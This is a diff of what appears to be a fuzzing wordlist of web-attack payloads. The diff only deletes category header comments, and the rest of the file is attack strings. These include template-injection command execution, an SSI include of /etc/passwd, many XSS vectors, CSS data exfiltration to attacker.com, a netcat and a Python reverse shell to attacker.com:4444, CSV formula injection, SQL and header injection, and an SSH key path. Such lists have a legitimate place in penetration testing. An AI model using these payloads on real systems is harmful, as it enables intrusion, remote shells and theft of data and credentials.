@@ -116,20 +116,17 @@ http://spoofed.169.254.169.254.xip.io/
 {% import "os" %}{{ os.popen("whoami").read() }}
 __import__('os').system('ls')
 <!--#include virtual="/etc/passwd" -->
-# --- INJECTION VARIANTS (CSV, XPath, SSI, Code, Log) ---
 <input onfocus=alert(1) autofocus>
 input[value^="a"] { background-image: url('https://attacker.com/exfil?char=a'); }
 <isindex type=image src=1 onerror=alert(1)>
 javascript:alert(1)
 javascript:confirm(1)
 javascript:prompt(1)
-# --- LFI & PATH TRAVERSAL ---
 ; ls -la
 <marquee onstart=alert(1)>
 <math><mtext><option><annotation><legend><path><svg><rect><foreignObject><p><table><script>alert(1)</script>
 {__name__=~".+"}
 ; nc -e /bin/sh attacker.com 4444
-# --- NOSQL, JWT, LDAP, CORS ---
 O:8:"Exploit":1:{s:4:"data";s:4:"test";}
 <object data="javascript:alert(1)">
 " OR "1"="1
@@ -171,7 +168,6 @@ phpinfo();
 __proto__[test]=test
 ; python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 query { user { password } }
-# --- RCE & CMD INJECTION ---
 {{request.application.__self__._mw_app.settings}}
 \r\nBcc: victim@domain.com
 \r\nContent-Type: text/html\r\n\r\n<h1>Hacked</h1>
@@ -193,10 +189,7 @@ rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcG
 & sleep 5
 ; sleep 5
 | sleep 5
-# --- SQL INJECTION ---
 /.ssh/id_rsa
-# --- SSRF & CLOUD ---
-# --- SSTI ---
 =SUM(1+1)*cmd|' /C calc'!A0
 @SUM(1+2)
 <svg/onload=alert(1)>
@@ -237,4 +230,3 @@ X-Forwarded-For: 127.0.0.1
 <xmp><p title="</xmp><svg/onload=alert(1)>">
 X-Original-URL: /admin
 X-Remote-IP: 127.0.0.1
-# --- XSS PAYLOADS ---
